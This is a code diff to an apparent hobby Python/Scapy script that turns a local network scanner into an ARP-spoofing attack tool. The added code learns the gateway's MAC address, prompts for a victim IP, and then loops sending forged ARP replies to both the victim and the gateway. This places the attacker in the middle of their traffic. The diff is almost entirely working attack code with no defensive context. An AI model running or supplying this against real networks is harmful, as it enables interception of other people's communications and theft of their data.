@@ -69,22 +69,81 @@ def scan(ip, subnet, gateway):
         try_count += 1
 
     clients = []
+    my_mac = ""
+    gateway_mac = ""
 
     if len(results) != 0:
         for sent, received in results:
             # psrc is the ip and hwsrc is the mac of the client that needs to be updated
             if received.psrc != gateway and received.psrc != ip:
                 clients.append({'ip': received.psrc, 'mac': received.hwsrc})
-    return clients
+            elif received.psrc == gateway:
+                gateway_mac = received.hwsrc
+            else:
+                my_mac = received.hwsrc
+    return clients, my_mac, gateway_mac
+
+
+def scan_gateway(default_gateway):
+    # Set the target ip
+    target_ip = default_gateway
+    # create ARP packet
+    arp_layer = ARP(pdst=target_ip)
+    # create the Ethernet broadcast packet
+    ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
+    # creating the packet
+    packet = ether_layer / arp_layer
+    result = ""
+    gateway_mac = ""
+
+    # keep sending arp packets until it receives an answer
+    while len(result) == 0:
+        result = srp(packet, timeout=3, verbose=0)[0]
+
+    for sent, received in result:
+        gateway_mac = received.hwsrc
+
+    return gateway_mac
+
+
+def arp_spoof(chosen_ip, spoof_ip, my_mac, victim_mac):
+        arp_packet = ARP(op=2, pdst=chosen_ip, psrc=spoof_ip, hwsrc=my_mac, hwdst=victim_mac)
+        send(arp_packet, verbose=0)
+
 
 
 if __name__ == '__main__':
     ip, subnet, default_gate = get_configs()
     time.sleep(2)
-    clients = scan(ip, subnet, default_gate)
+    clients, my_mac, gateway_mac = scan(ip, subnet, default_gate)
     print("IP" + " "*15 + "MAC")
     if clients:
         for client in clients:
             print("{}   {}".format(client['ip'], client['mac']))
     else:
         print("scan failed")
+
+    if not gateway_mac:
+        gateway_mac = scan_gateway(default_gate)
+
+    my_mac = ARP().hwsrc
+    print("5" + gateway_mac)
+
+
+    print(my_mac)
+    if my_mac and gateway_mac:
+        # choose an ip of the victim
+        chosen_ip = input("Enter IP")
+        for client in clients:
+            if client['ip'] == chosen_ip:
+                chosen_mac = client['mac']
+        while True:
+            try:
+                arp_spoof(chosen_ip, default_gate, my_mac, chosen_mac)
+                arp_spoof(default_gate, chosen_ip, my_mac, gateway_mac)
+            except KeyboardInterrupt:
+                print("finish")
+                break
+    else:
+        print("Doesnt have mac")
+
